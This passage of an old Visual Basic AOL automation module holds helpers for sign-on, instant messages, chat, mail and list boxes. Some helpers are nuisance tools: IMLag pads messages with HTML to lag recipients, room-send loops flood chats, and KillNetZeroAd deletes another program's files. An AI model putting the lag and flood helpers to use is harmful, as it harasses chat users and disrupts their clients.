AoStatic2& = FindWindowEx(MessageWindow&, AoStatic1&, "_AOL_Static", vbNullString)
If StaticWindow2& <> 0& Then
GetMessageText$ = GetText(StaticWindow2&)
ElseIf AoStatic2& <> 0& Then
GetMessageText$ = GetText(AoStatic2&)
End If
End Function
Public Function GetFromINI(lSection As String, lKey As String, lDirectory As String) As String
  'by del (i dont fool with ini's to much, heh)
        Dim lstrBuffer As String
lstrBuffer = String(750, Chr(0))
lKey$ = LCase$(lKey$)
GetFromINI$ = Left(lstrBuffer, GetPrivateProfileString(lSection$, ByVal lKey$, "", lstrBuffer, Len(lstrBuffer), lDirectory$))
End Function
Public Function GetListText(WinHandle As Long) As String
        Dim wgf As String, TxtLength As Long
TxtLength& = SendMessage(WinHandle&, LB_GETTEXTLEN, 0&, 0&)
wgf$ = String(TxtLength&, 0&)
Call SendMessageByString(WinHandle&, LB_GETTEXT, TxtLength& + 1, wgf$)
GetListText$ = wgf$
End Function
Public Function GetText(WinHandle As Long) As String
        Dim wgf As String, TxtLength As Long
TxtLength& = SendMessage(WinHandle&, WM_GETTEXTLENGTH, 0&, 0&)
wgf$ = String(TxtLength&, 0&)
Call SendMessageByString(WinHandle&, WM_GETTEXT, TxtLength& + 1, wgf$)
GetText$ = wgf$
End Function
Public Function GetUser() As String
'Gets the user sn
 If FindWelcome& = 0& Then Exit Function
    GetUser$ = Mid$(GetCaption(FindWelcome&), 10, (InStr(GetCaption(FindWelcome&), "!") - 10))
End Function
Public Sub GhostageOn()
'Work on, heh
End Sub
Public Sub GuestSignOn(ScreenName As String, Password As String)
'Sign on as guest
If FindSignOnScreen& = 0& Then Exit Sub
        Dim MessageOk As Long, OKButton As Long, AoModal As Long
        Dim AoEdit1 As Long, AoEdit2 As Long, AoIcon1 As Long
        Dim AoIcon2 As Long
Call GuestSetToGuest
AoIcon1& = NextOfClassByCount(FindSignOnScreen&, "_AOL_Icon", 4)
Call PostMessage(AoIcon1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon1&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoEdit1& = FindWindowEx(AoModal&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(AoModal&, AoEdit1&, "_AOL_Edit", vbNullString)
AoIcon2& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until AoModal& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0 And AoIcon2& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(AoEdit2&, WM_SETTEXT, 0&, Password$)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, ScreenName$)
Call SendMessageByString(AoEdit2&, WM_SETTEXT, 0&, Password$)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindWelcome& <> 0&
If MessageOk& <> 0& And OKButton& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Exit Sub
ElseIf FindWelcome& <> 0& Then
Exit Sub
End If
ElseIf FindWelcome& <> 0& Then
Exit Sub
End If
End Sub
Public Function Guest() As Boolean
'Checks to see if the user is a guest
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AddressBook As Long, MessageOk As Long, OKButton As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
Call PopUpIcon(2, "A")
Do: DoEvents
AddressBook& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Address Book")
MessageOk& = FindWindow("#32770", "America Online")
Loop Until AddressBook& <> 0& Or MessageOk& <> 0&
If AddressBook& <> 0& Then
Call PostMessage(AddressBook&, WM_CLOSE, 0&, 0&)
Guest = False
Exit Function
ElseIf MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Guest = True
Exit Function
End If
End Function
Public Sub GuestSetToGuest()
'Clicks that little Ao-Pull down thing that slects your SN to guest
        Dim ComboBox As Long
If FindSignOnScreen& = 0& Then Exit Sub
ComboBox& = FindWindowEx(FindSignOnScreen&, 0&, "_AOL_Combobox", vbNullString)
Call PostMessage(ComboBox&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(ComboBox&, WM_LBUTTONUP, 0&, 0&)
Call SendMessageLong(ComboBox&, CB_SETCURSEL, ComboCount(ComboBox&) - 1, 0&)
Call PostMessage(ComboBox&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(ComboBox&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub GuestSetSnAndPw(SN As String, PW As String)
'Put in the pw and sn for guest sign on
        Dim AoModal As Long, AoEdit1 As Long, AoEdit2 As Long
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoEdit1& = FindWindowEx(AoModal&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(AoModal&, AoEdit1&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, SN$)
Call SendMessageByString(AoEdit2&, WM_SETTEXT, 0&, PW$)
End Sub
Public Sub GuestClickSignOn()
'Clicks Sign on
        Dim aolicon As Long
If NextOfClassByCount(FindSignOnScreen&, "_AOL_Icon", 4) <> 0& Then
aolicon& = NextOfClassByCount(FindSignOnScreen&, "_AOL_Icon", 4)
Else
aolicon& = NextOfClassByCount(FindSignOnScreen&, "_AOL_Icon", 3)
End If
Call PostMessage(aolicon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(aolicon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Sub HideAol()
'Hides Aol
        Dim AoFrame As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AoFrame&, 0)
End Sub
Public Sub HideWelcomeWindow()
'Hides the AoWelcome Window
        Dim AoFrame As Long, AoWelcome As Long, AoClient As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoClient& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoWelcome& = (FindWelcome)
WindowHide (AoWelcome&)
End Sub
Public Sub icon(elIcon As Long)
'Clicks an aoicon
Call SendMessage(elIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(elIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Sub CD_CloseDoorCD()
'Closes your cd rom drive
'Example:
'Call CD_CloseDoor
Call MciSendString("set cd door closed", 0, 0, 0)
End Sub
Public Function ClassInstance(ParentWindow As Long, ClassWindow As String) As Long
        Dim OnInstance As Long, CurrentCount As Long
If FindWindowEx(ParentWindow&, 0&, ClassWindow$, vbNullString) = 0& Then Exit Function
ClassInstance& = 0&
Do: DoEvents
OnInstance& = FindWindowEx(ParentWindow&, OnInstance&, ClassWindow$, vbNullString)
If OnInstance& <> 0& Then
CurrentCount& = CurrentCount& + 1
Else
Exit Do
End If
Loop
ClassInstance& = CurrentCount&
End Function
Public Sub ClearHistory()
'This clears the history bar on the Aol tool bar Note: Not Permenent
'Example:
'Call ClearHistory
        Dim AoFrame As Long, AoBar As Long, Toolbar As Long, AoMDI As Long
        Dim ComboBox As Long, edit As Long, Keyword As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoBar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
Toolbar& = FindWindowEx(AoBar, 0&, "_AOL_Toolbar", vbNullString)
ComboBox& = FindWindowEx(Toolbar&, 0&, "_AOL_Combobox", vbNullString)
edit& = FindWindowEx(ComboBox&, 0&, "Edit", vbNullString)
Call SendMessageLong(ComboBox&, CB_RESETCONTENT, 0&, 0&)
Call SendMessageByString(edit&, WM_SETTEXT, 0&, "Type Keyword or Web Address here and click Go")
Call SendMessageLong(edit&, WM_CHAR, VK_SPACE, 0&)
Call SendMessageLong(edit&, WM_CHAR, VK_RETURN, 0&)
Do: DoEvents
Keyword& = FindChildByTitleEx(AoMDI&, "Keyword Not Found")
Loop Until Keyword& <> 0&
Call WinClose(Keyword&)
End Sub
Public Sub ClickIcon(elIcon As Long)
'Clicks Aoicons
'Example:
'Call ClickIcon(Booger&)
Call SendMessage(elIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(elIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Function CountDownToY2K() As String
'Tells the time till the Y2K
'Example:
'Msgbox(countdowntoy2k)
        Dim wgf As String, HoursTill As String, MinsTill As String
        Dim SecondsTill As String, DaysTill As String
        Dim MonthsTill As String, YearsTill As String
HoursTill = Hour(Time)
MinsTill = Minute(Time)
SecondsTill = Second(Time)
DaysTill = Day(Date)
YearsTill = Year(Date)
MonthsTill = Month(Date)
If YearsTill = 2000 Then
CountDownToY2K = "Uh oh, its the end of the world as we know it!"
Exit Function
End If
MonthsTill = 12 - MonthsTill
DaysTill = 31 - DaysTill
HoursTill = 23 - HoursTill
MinsTill = 59 - MinsTill
SecondsTill = 59 - SecondsTill
wgf = MonthsTill & " months, " & DaysTill & " days, " & HoursTill & " hours, "
wgf = wgf & MinsTill & " minutes, " & SecondsTill & " seconds until Y2K."
CountDownToY2K = wgf
End Function
Sub FolderCreate(NewDir)
'Makes a new folder
MkDir NewDir
End Sub
Sub FolderDelete(NewDir)
'Deltes a folder
RmDir (NewDir)
End Sub
Public Sub IMCloseWindows()
'lose all the IM windows good for IM answers and mass imers
Do: DoEvents
Call WinClose(FindIM&)
Loop Until FindIM& = 0&
End Sub
Public Function IMCheck(Person As String) As String
'This does the same thing as CheckIMs Except this dosnt allow the user to see the msg box that aol gives that says wheather the SN can recive Ims
        Dim AoFrame As Long, AoMDI As Long, ImSendWindow As Long
        Dim AoEdit As Long, AoIcon As Long
        Dim MessageOk As Long, OKButton As Long, Static1 As Long
        Dim Static2 As Long
Call PopUpIcon(9, "I")
Do: DoEvents
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
ImSendWindow& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Send Instant Message")
AoEdit& = FindWindowEx(ImSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoIcon& = NextOfClassByCount(ImSendWindow&, "_AOL_Icon", 10)
Loop Until ImSendWindow& <> 0& And AoEdit& <> 0& And AoIcon& <> 0&
Call SendMessageByString(AoEdit&, WM_SETTEXT, 0&, Person$)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Static1& = FindWindowEx(MessageOk&, 0&, "Static", vbNullString)
Static2& = FindWindowEx(MessageOk&, Static1&, "Static", vbNullString)
IMCheck$ = GetText(Static2&)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(ImSendWindow&, WM_CLOSE, 0&, 0&)
End If
End Function
Public Sub IMIgnore(SN As String)
'Turns your imsoff the a specific person
Call InstantMessage("$IM_OFF, " & SN$, "He must be anoying!")
End Sub
Public Function IMLastMsg() As String
'Gets an Ims last message
        Dim Rich As Long, MsgString As String, Place As Long
        Dim Place2 As Long
Rich& = FindWindowEx(FindIM&, 0&, "RICHCNTL", vbNullString)
MsgString$ = GetText(Rich&)
Place2& = InStr(MsgString$, Chr(9))
Do
Place& = Place2&
Place2& = InStr(Place& + 1, MsgString$, Chr(9))
Loop Until Place2& <= 0&
MsgString$ = Right(MsgString$, Len(MsgString$) - Place2& - 1)
IMLastMsg$ = Left(MsgString$, Len(MsgString$) - 1)
End Function
Function IMLag(SN As String, msg As String)
'No its not a punt, its like a text lag for the chat but in an im =)
        Dim wgf As String, Length As Integer
        Dim Newl As String, Number As Integer
        Dim Nextl As String
Let wgf$ = SN$
Let Length% = Len(wgf$)
Do While Number% <= Length%
Let Number% = Number% + 1
Let Nextl$ = Mid$(wgf$, Number%, 1)
Let Nextl$ = Nextl$ + "<HTML></HTML><HTML></HTML><HTML></HTML>"
Let Newl$ = Newl$ + Nextl$
Loop
IMLag = Newl$
Call InstantMessage(SN$, "</B></I></U><font color=#000000>" + IMLag + "")
End Function
Public Sub IMRespond(message As String)
'Responds to an IM
        Dim IM As Long, Rich1 As Long, AoIcon As Long
IM& = FindIM&
If IM& = 0& Then Exit Sub
Rich1& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
Rich1& = FindWindowEx(IM&, Rich1&, "RICHCNTL", vbNullString)
AoIcon& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
AoIcon& = FindWindowEx(IM&, AoIcon&, "_AOL_Icon", vbNullString)
Call SendMessageByString(Rich1&, WM_SETTEXT, 0&, message$)
DoEvents
Call SendMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Function IMSender() As String
'Gets the IM sender
        Dim IM As Long, IMCaption As String
IMCaption$ = GetCaption(FindIM&)
If InStr(IMCaption$, ":") = 0& Then
IMSender$ = ""
Else
Exit Function
IMSender$ = Right(IMCaption$, Len(IMCaption$) - InStr(IMCaption$, ":") - 1)
End If
End Function
Public Sub IMsOff()
'Turns Ims off
Call InstantMessage("$IM_OFF", "Your IMs Are Off Thanks To wgf!")
End Sub
Public Sub IMsOn()
'Turns Ims on
Call InstantMessage("$IM_ON", "Your IMs Are On Thanks To wgf!")
End Sub
Public Function IMText() As String
'Same as lastmsg
        Dim Rich1 As Long
Rich1& = FindWindowEx(FindIM&, 0&, "RICHCNTL", vbNullString)
IMText$ = GetText(Rich1&)
End Function
Public Sub IMUnIgnore(SN As String)
'Unignores the SN you were ignoring
Call InstantMessage("$IM_ON, " & SN$, "WoW isnt he lucky?")
End Sub
Public Sub InstantMessage(SN As String, msg As String)
'Sends an IM
        Dim aol As Long, MDI As Long, IM As Long, Rich1 As Long
        Dim SendButton As Long, OK As Long, Button As Long
aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
Call Keyword("aol://9293:" & SN$)
Do
DoEvents
IM& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
Rich1& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
SendButton& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(IM&, SendButton&, "_AOL_Icon", vbNullString)
Loop Until IM& <> 0& And Rich1& <> 0& And SendButton& <> 0&
Call SendMessageByString(Rich1&, WM_SETTEXT, 0&, msg$)
Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
Do
DoEvents
OK& = FindWindow("#32770", "America Online")
IM& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
Loop Until OK& <> 0& Or IM& = 0&
If OK& <> 0& Then
Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(IM&, WM_CLOSE, 0&, 0&)
End If
End Sub
Public Sub Keyword(Keyword As String)
'Goes to a keyword
        Dim AoFrame As Long, AoTool As Long, AoBar As Long
        Dim Combo As Long, EditWin As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoTool& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
AoBar& = FindWindowEx(AoTool&, 0&, "_AOL_Toolbar", vbNullString)
Combo& = FindWindowEx(AoBar&, 0&, "_AOL_Combobox", vbNullString)
EditWin& = FindWindowEx(Combo&, 0&, "Edit", vbNullString)
Call SendMessageByString(EditWin&, WM_SETTEXT, 0&, Keyword$)
Call SendMessageLong(EditWin&, WM_CHAR, VK_SPACE, 0&)
Call SendMessageLong(EditWin&, WM_CHAR, VK_RETURN, 0&)
End Sub
Public Sub KillModal()
'Kills the modal
        Dim AoModal As Long, AoIcon As Long
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoIcon& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub KillWait()
'gets rid of aol's hour glass
        Dim AoModal As Long, AoIcon As Long, AoFrame As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Call RunMenuByString(AoFrame&, "&About America Online")
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoIcon& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until AoModal& <> 0& And AoIcon& <> 0&
Call PostMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub KillNetZeroAd(NetZeroDir As String)
'NetZero is a free internet service that sucks.
'Are you decent at api and tried to hide the netzero add window?
'But then a little window came up and said naughty, naughty?
'Well heres how to get rid of teh add. =)
    Dim TheDir$
    If Dir(NetZeroDir$) = "" Then Exit Sub
    If Right(NetZeroDir$, 1) = "\" Then NetZeroDir$ = Left(NetZeroDir$, Len(NetZeroDir$) - 1)
    TheDir$ = NetZeroDir$ & "\Bin\"
    Call Kill(TheDir$ & "JdbcOdbc.dll")
    DoEvents
    Call Kill(TheDir$ & "jpeg.dll")
    DoEvents
    Call Kill(TheDir$ & "jre.exe")
    DoEvents
    Call Kill(TheDir$ & "jrew.exe")
    DoEvents
    Call Kill(TheDir$ & "math.dll")
    DoEvents
    Call Kill(TheDir$ & "mmedia.dll")
    DoEvents
    Call Kill(TheDir$ & "net.dll")
    DoEvents
    Call Kill(TheDir$ & "rmiregistry.exe")
    DoEvents
    Call Kill(TheDir$ & "symcjit.dll")
    DoEvents
    Call Kill(TheDir$ & "sysresource.dll")
    DoEvents
End Sub
Public Function LineChar(TheTxt As String, CharNum As Long) As String
        Dim Txt As Long, NewTxt As String
Txt& = Len(TheTxt$)
If CharNum& > Txt Then
Exit Function
End If
NewTxt$ = Left(TheTxt$, CharNum&)
NewTxt$ = Right(NewTxt$, 1)
LineChar$ = NewTxt$
End Function
Public Function LineCountHwnd(WinHandle As Long) As Long
        Dim CurrentCount As Long
On Local Error Resume Next
CurrentCount& = SendMessageLong(WinHandle&, EM_GETLINECOUNT, 0&, 0&)
LineCountHwnd& = Format$(CurrentCount&, "##,###")
End Function
Public Function LineCount(StringToCount As String) As Long
If Len(StringToCount$) = 0& Then
LineCount& = 0
Exit Function
End If
LineCount& = StringCount(StringToCount$, vbCr) + 1
End Function
Public Function ListCount(listbox As Long) As Long
ListCount& = SendMessageLong(listbox&, LB_GETCOUNT, 0&, 0&)
End Function
Public Function LineFromString(MyString As String, Line As Long) As String
        Dim LineB As String, Number As Long
        Dim Place As Long, Place2 As Long, Start As Long
Number& = LineCount(MyString$)
If Line& > Number& Then
Exit Function
End If
If Line& = 1 And Number& = 1 Then
LineFromString$ = MyString$
Exit Function
End If
If Line& = 1 Then
LineB$ = Left(MyString$, InStr(MyString$, Chr(13)) - 1)
LineB$ = ReplaceString(LineB$, Chr(13), "")
LineB$ = ReplaceString(LineB$, Chr(10), "")
LineFromString$ = LineB$
Exit Function
Else
Place& = InStr(MyString$, Chr(13))
For Start& = 1 To Line& - 1
Place2& = Place&
Place& = InStr(Place& + 1, MyString$, Chr(13))
Next Start
If Place = 0 Then
Place = Len(MyString$)
End If
LineB$ = Mid(MyString$, Place2&, Place& - Place2& + 1)
LineB$ = ReplaceString(LineB$, Chr(13), "")
LineB$ = ReplaceString(LineB$, Chr(10), "")
LineFromString$ = LineB$
End If
End Function
Public Function ListToMailString(List As listbox) As String
'Makes your list ready for a mail
        Dim List1 As Long, Mail As String
If List.List(0) = "" Then Exit Function
For List1& = 0 To List.ListCount - 1
Mail$ = Mail$ & "(" & List.List(List1&) & "), "
Next List1&
Mail$ = Mid(Mail$, 1, Len(Mail$) - 2)
ListToMailString$ = Mail$
End Function
Public Sub ListSearchScroll(listbox As listbox, SearchString As String, Optional Delay As Single = "0.6")
        Dim Search  As Long
For Search& = 0 To listbox.ListCount - 1
If InStr(LCase(listbox.List(Search&)), LCase(SearchString$)) <> 0& Then Call RoomSend(listbox.List(Search&))
Call Yield(Val(Delay))
Next Search&
End Sub
Public Sub ListSetFocus(listbox As Long, ListIndex As Long)
'Set focus to list box
Call SendMessageLong(listbox&, LB_SETCURSEL, ListIndex&, 0&)
End Sub
Public Sub ListClear(listbox As listbox)
'Clears a list box
listbox.Clear
End Sub
Public Sub ListKillDupes(listbox As listbox)
'Kills dublicite items in a listbox
        Dim Search1 As Long
        Dim Search2 As Long
        Dim KillDupe As Long
KillDupe = 0
For Search1& = 0 To listbox.ListCount - 1
For Search2& = Search1& + 1 To listbox.ListCount - 1
KillDupe = KillDupe + 1
If listbox.List(Search1&) = listbox.List(Search2&) Then
listbox.RemoveItem Search2&
Search2& = Search2& - 1
End If
Next Search2&
Next Search1&
End Sub

Public Function ListToTextString(listbox As listbox, InsertSeparator As String) As String
'Makes list a txt string
        Dim CurrentCount As Long, PrepString As String
For CurrentCount& = 0 To listbox.ListCount - 1
PrepString$ = PrepString$ & listbox.List(CurrentCount&) & InsertSeparator$
Next CurrentCount&
ListToTextString$ = Left(PrepString$, Len(PrepString$) - 2)
End Function
Public Sub ListCopy(SourceList As Long, DestinationList As Long)
'Copys a list to another
        Dim SourceCount As Long, OfCountForIndex As Long, FixedString As String
SourceCount& = SendMessageLong(SourceList&, LB_GETCOUNT, 0&, 0&)
Call SendMessageLong(DestinationList&, LB_RESETCONTENT, 0&, 0&)
If SourceCount& = 0& Then Exit Sub
For OfCountForIndex& = 0 To SourceCount& - 1
FixedString$ = String(250, 0)
Call SendMessageByString(SourceList&, LB_GETTEXT, OfCountForIndex&, FixedString$)
Call SendMessageByString(DestinationList&, LB_ADDSTRING, 0&, FixedString$)
Next OfCountForIndex&
End Sub

Public Function ListGetText(listbox As Long, Index As Long) As String
        Dim ListText As String * 256
Call SendMessageByString(listbox&, LB_GETTEXT, Index&, ListText$)
ListGetText$ = ListText$
End Function
Public Sub ListRoomSend(List As listbox)
'Sends listbox contents to a room
        Dim lst As Long
For lst = 0 To List.ListCount - 1
RoomSend List.List(lst)
Pause 0.6
Next lst
End Sub
Public Sub ListRemoveSelected(listbox As listbox)
        Dim ListCount As Long
ListCount& = listbox.ListCount
Do While ListCount& > 0&
ListCount& = ListCount& - 1
If listbox.Selected(ListCount&) = True Then
listbox.RemoveItem (ListCount&)
End If
Loop
End Sub
Public Sub Load2listboxes(Path As String, List1 As listbox, List2 As listbox)
'Loads To list boxes
        Dim MyString As String, String1 As String, String2 As String
On Error Resume Next
Open Path$ For Input As #1
While Not EOF(1)
Input #1, MyString$
String1$ = Left(MyString$, InStr(MyString$, "*") - 1)
String2$ = Right(MyString$, Len(MyString$) - InStr(MyString$, "*"))
DoEvents
List1.AddItem String1$
List2.AddItem String2$
Wend
Close #1
End Sub
Public Sub LoadComboBox(ByVal Path As String, Combo1 As ComboBox)
'Loads combobox
        Dim MyString As String
On Error Resume Next
Open Path$ For Input As #1
While Not EOF(1)
Input #1, MyString$
DoEvents
Combo1.AddItem MyString$
Wend
Close #1
End Sub
Public Sub Loadlistbox(Path As String, List1 As listbox)
'Loads list box
        Dim wgf As String
On Error Resume Next
Open Path$ For Input As #1
While Not EOF(1)
Input #1, wgf$
DoEvents
List1.AddItem wgf$
Wend
Close #1
End Sub
Sub LoadText(txtLoad As TextBox, MyPath As String)
'Loads txt
        Dim TextString As String
On Error Resume Next
Open MyPath$ For Input As #1
TextString$ = Input(LOF(1), #1)
Close #1
txtLoad.Text = TextString$
End Sub
Public Function LocateMember(Person As String) As String
'Locate a member
            Dim AoFrame As Long, AoMDI As Long, AoChild As Long
            Dim LocateMemberWindow As Long, AoEdit As Long, Static1 As Long
            Dim Static2 As Long, LocatedWindow As Long, message As Long
            Dim Button As Long, AoStatic As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
Call PopUpIcon(9, "L")
Do: DoEvents
LocateMemberWindow& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Locate Member Online")
AoEdit& = FindWindowEx(LocateMemberWindow&, 0&, "_AOL_Edit", vbNullString)
Loop Until LocateMemberWindow& <> 7 And AoEdit& <> 0&
Call SendMessageByString(AoEdit&, WM_SETTEXT, 0&, Person$)
Call SendMessageLong(AoEdit&, WM_CHAR, VK_SPACE, 0&)
Call SendMessageLong(AoEdit&, WM_CHAR, VK_RETURN, 0&)
Do: DoEvents
LocatedWindow& = FindLocatedWindow&
message& = FindWindow("#32770", "America Online")
Loop Until LocatedWindow& <> 0& Or message& <> 0&
If LocatedWindow& <> 0& Then
AoStatic& = FindWindowEx(LocatedWindow&, 0&, "_AOL_Static", vbNullString)
LocateMember$ = GetText(AoStatic&)
Call PostMessage(LocatedWindow&, WM_CLOSE, 0&, 0&)
Call PostMessage(LocateMemberWindow&, WM_CLOSE, 0&, 0&)
Exit Function
Else
Static1& = FindWindowEx(message&, 0&, "Static", vbNullString)
Static2& = FindWindowEx(message&, Static1&, "Static", vbNullString)
Button& = FindWindowEx(message&, 0&, "Button", vbNullString)
LocateMember$ = ReplaceCharacters(GetText(Static2&), "Member", Person$)
Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(LocateMemberWindow&, WM_CLOSE, 0&, 0&)
Exit Function
End If
End Function
Public Sub LoopWAV(Path As String)
'Loops a wav
Call SndPlaySound(Path$, Snd_Flag2)
End Sub
'<<<<<<<<<<<<<<<<<<<<<<<Mail Subs/Functions Start Here>>>>>>>>>>>>>>>>>>>>>>>>>
'Im not writing examples or what they are for any of the mail suff deal with it theres just to many
Public Sub MailAttachFile(Path As String)
        Dim AoFrame As Long, AoMdiClient As Long, AoIcon As Long
        Dim AoBar As Long, Mail As Long, MailSendIcon As Long
        Dim MailSendIcon1 As Long, MailSendIcon2 As Long, MailSendIcon3 As Long
        Dim MailSendIcon4 As Long, MailsendIcon5 As Long, MailSendIcon6 As Long
        Dim MailSendIcon7 As Long, MailSendIcon8 As Long, MailSendIcon9 As Long
        Dim MailSendIcon10 As Long, MailSendIcon11 As Long, MailSendIcon12 As Long
        Dim AttachIcon As Long, AoModal As Long, ModalAttachIcon As Long
        Dim ModalOkIcon As Long, AttachmentsDialog As Long, FileEdit As Long
        Dim OpenButton As Long
    
AoFrame = FindWindow("AOL Frame25", vbNullString)
AoMdiClient = FindWindowEx(AoFrame, 0, "MDIClient", vbNullString)
Mail = FindWindowEx(AoMdiClient, 0, "AOL Child", "Write Mail")
AoBar = FindWindowEx(AoFrame, 0, "AOL Toolbar", vbNullString)
AoBar = FindWindowEx(AoBar, 0, "_AOL_Toolbar", vbNullString)
If Mail = 0 Then
AoIcon = FindWindowEx(AoBar, 0, "_AOL_Icon", vbNullString)
